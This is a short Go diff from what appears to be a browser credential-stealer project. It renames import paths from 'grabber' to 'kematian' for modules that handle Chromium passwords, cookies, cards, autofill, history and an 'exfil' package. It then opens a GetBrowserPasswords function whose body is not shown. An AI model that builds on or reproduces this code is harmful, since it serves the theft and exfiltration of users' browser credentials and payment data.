@@ -1,16 +1,16 @@
 package browsers
 
 import (
-	"kdot/grabber/browsers/chromium/autofill"
-	"kdot/grabber/browsers/chromium/cards"
-	"kdot/grabber/browsers/chromium/cookies"
-	"kdot/grabber/browsers/chromium/downloads"
-	"kdot/grabber/browsers/chromium/finder"
-	"kdot/grabber/browsers/chromium/history"
-	"kdot/grabber/browsers/chromium/pass"
-	"kdot/grabber/browsers/chromium/structs"
-	"kdot/grabber/browsers/util"
-	"kdot/grabber/exfil"
+	"kdot/kematian/browsers/chromium/autofill"
+	"kdot/kematian/browsers/chromium/cards"
+	"kdot/kematian/browsers/chromium/cookies"
+	"kdot/kematian/browsers/chromium/downloads"
+	"kdot/kematian/browsers/chromium/finder"
+	"kdot/kematian/browsers/chromium/history"
+	"kdot/kematian/browsers/chromium/pass"
+	"kdot/kematian/browsers/chromium/structs"
+	"kdot/kematian/browsers/util"
+	"kdot/kematian/exfil"
 )
 
 func GetBrowserPasswords(browsers []structs.Browser) {
